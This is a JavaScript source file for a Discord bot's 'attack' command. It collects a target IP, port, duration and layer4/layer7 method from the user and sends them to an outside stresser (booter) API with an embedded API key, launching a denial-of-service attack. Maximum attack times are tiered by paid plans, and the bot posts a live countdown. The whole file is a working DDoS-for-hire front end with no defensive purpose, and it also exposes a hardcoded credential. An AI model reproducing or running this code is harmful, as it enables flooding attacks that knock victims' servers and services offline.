const { EmbedBuilder, ButtonBuilder, ActionRowBuilder, ComponentType  } = require("discord.js");
const config = require('../config/config')
const axios = require('axios')
module.exports = {
    id: "attack",
    run: async (client, interaction, config, db) => {

        // Import Method
        const methode = config.Method.layer4 + config.Method.layer7

        // Plan
        const Sliver = config.Sliver
        const Gold = config.Gold
        const GOD = config.GOD
        const Owners = config.Users.OWNERS

        // Option
        const ip = interaction.fields.getTextInputValue('ip')
        const port = interaction.fields.getTextInputValue('port')
        var time = interaction.fields.getTextInputValue('time')
        const method = interaction.fields.getTextInputValue('methode')
        var black_list = config.Black_list
        var api = `https://stresser.website/hub/api/api.php?key=nnadptrppjncu7jc14jswobus33p70&host=${ip}&port=${port}&time=${time}&method=${method}`
        var getid = interaction.user.id
        // Emoji
        const check = config.icon.check
        const errorss = config.icon.error
        
        //Button
        const row = new ActionRowBuilder()
			.addComponents(
                new ButtonBuilder()
                .setCustomId('stop')
                .setLabel('STOP')
                .setStyle('Danger'),

                new ButtonBuilder()
                .setCustomId('restart')
                .setLabel('RESTART')
                .setStyle('Success')

			);
        
        // Embed Attack
        const embedAttack = new EmbedBuilder()
            .setTitle('Attack Information')
            .addFields({
                name: '**`📡 HOST`**',
                value: ip,
                inline: true
            })
            .addFields({
                name: '**`📞 PORT`**',
                value: port,
                inline: true
                
            })
            .addFields({
                name: '**`⌛️ TIME`**',
                value: time,
                inline: true
                
            })
            .addFields({
                name: '**`💻 METHODE`**',
                value: method,
                inline: true
            })
            .addFields({
                name: '**`🔧 COOLDOWN`**',
                value: 'N/A Seconds',
                inline: true
            })
        
        if(interaction.channel == null){
            return false;
        }

        if(Owners.includes(getid)){
            console.log(time)
        }
        else if(Sliver.id.includes(getid)){
            if(time > Sliver.maxtime){
                const embed = new EmbedBuilder()
                .setDescription( '⌛️ **Max Time: `' + Sliver.maxtime + '` \n 🚀 Upgrade your plan**')
                interaction.reply({
                    embeds: [embed]
                })
                return false;
            }
            else {
                console.log(getid)
            }
        }
        else if(Gold.id.includes(getid)){
            if(time > Gold.maxtime){
                const embed = new EmbedBuilder()
                .setDescription( '⌛️ **Max Time: `' + Gold.maxtime + '` \n 🚀 Upgrade your plan**')
                interaction.reply({
                    embeds: [embed]
                })
                return false;
            }
            else {
                console.log(getid)
            }
        }
        else if(GOD.id.includes(getid)){
            if(time > GOD.maxtime){
                const embed = new EmbedBuilder()
                .setDescription( '⌛️ **Max Time: `' + GOD.maxtime + '`\n 🚀 Upgrade your plan**')
                interaction.reply({
                    embeds: [embed]
                })
                return false;
            }
            else {
                console.log(getid)
            }
        } else {
            console.log('No have Plan')
        }

        if(methode.includes(method)){

        function checkBlackList(ip) {
            for (let i = 0; i < black_list.length; i++) {
                if (ip.startsWith(black_list[i]) || ip === black_list[i]) {
                return true;
                }
            }
            return false;
        }

        if(checkBlackList(ip)){
            const embed = new EmbedBuilder()
            .setDescription('**BLACK LIST : `' + ip + '`**')
            interaction.reply({
                embeds: [embed]
            })
            return false;
        }
        
        axios.get(api).then(function (response){
            console.log(response)
            interaction.reply({
                embeds: [embedAttack],
                
            })

            // Button Restart,

            // Send Time Embed
            const interval = setInterval(() => {
                if (time <= 0) {
                    clearInterval(interval);
                    const finish = new EmbedBuilder()
                    .setDescription('**Attack Finish **' + check)
                    interaction.editReply({
                        embeds: [finish],
                        
                    })
                    return; 

                }
                
                const EmbedTime = new EmbedBuilder()
                .setTitle('Attack Information')
                .addFields({
                    name: '**`📡 HOST`**',
                    value: ip,
                    inline: true
                })
                .addFields({
                    name: '**`📞 PORT`**',
                    value: port,
                    inline: true
                    
                })
                .addFields({
                    name: '**`⌛️ TIME`**',
                    value: `${time}/s`,
                    inline: true
                    
                })
                .addFields({
                    name: '**`💻 METHODE`**',
                    value: method,
                    inline: true
                })
                .addFields({
                    name: '**`🔧 COOLDOWN`**',
                    value: 'N/A Seconds',
                    inline: true
                })
                interaction.editReply({
                    embeds: [EmbedTime],
                    
                })
                time--;
            }, 1000);

            
              
        })


        
        
        }
         
          
    }
    
    
};